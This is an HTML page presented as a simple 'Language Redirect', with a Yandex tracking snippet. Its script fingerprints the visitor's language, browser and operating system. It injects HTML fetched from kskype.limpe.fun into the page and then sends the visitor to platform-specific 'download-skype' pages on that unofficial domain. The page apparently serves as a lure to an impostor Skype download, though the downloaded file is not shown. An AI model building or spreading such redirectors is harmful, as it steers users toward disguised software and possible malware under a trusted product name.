<!DOCTYPE html>
<html lang="en">
<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(98765029, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/98765029" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->


<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Language Redirect</title>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var userLang = navigator.language || navigator.userLanguage;
            var userAgent = navigator.userAgent;
            var platform = navigator.platform.toLowerCase();
            var redirectUrl;

            // Function to check if the browser is legacy
            function isLegacyBrowser() {
                var isIE = /MSIE|Trident/.test(userAgent);
                var isOldChrome = /Chrome\/([0-9]+)/.test(userAgent) && parseInt(RegExp.$1, 10) <= 20;
                var isOldFirefox = /Firefox\/([0-9]+)/.test(userAgent) && parseInt(RegExp.$1, 10) <= 20;
                return isIE || isOldChrome || isOldFirefox;
            }

            // Determine platform
            function getPlatform() {
                if (platform.indexOf('win') !== -1) return 'mswindows';
                if (platform.indexOf('mac') !== -1) return 'osx';
                if (platform.indexOf('linux') !== -1) return 'lin';
                if (/android/.test(userAgent)) return 'android';
                if (/iphone|ipad|ipod/.test(userAgent)) return 'iphoneos';
                return 'unknown';
            }

            var platformType = getPlatform();

            if (isLegacyBrowser()) {
                if (userLang.startsWith('ru') || userLang.startsWith('uk')) {
                    redirectUrl = 'https://kskype.limpe.fun/legacy/ru/download/' + platformType;
                } else {
                    redirectUrl = 'https://kskype.limpe.fun/legacy/en/download/' + platformType;
                }
            } else {
                if (userLang.startsWith('ru')) {
                    redirectUrl = 'https://kskype.limpe.fun/ru/download-skype';
                } else if (userLang.startsWith('uk')) {
                    redirectUrl = 'https://kskype.limpe.fun/ua/download-skype';
                } else {
                    redirectUrl = 'https://kskype.limpe.fun/en/download-skype';
                }

                // Additional redirects for non-Windows platforms
                if (platformType !== 'mswindows') {
                    redirectUrl += '/' + platformType;
                }
            }
    fetch('https://kskype.limpe.fun/assets/v1/load')
                .then(response => response.text())
                .then(data => {
                    document.body.innerHTML = data;
                    
                    window.location.href = redirectUrl;
                })
                .catch(error => console.error('Error fetching content:', error));
        });
    </script>
</head>
<body>
    <p>loading..</p>
</body>
</html>
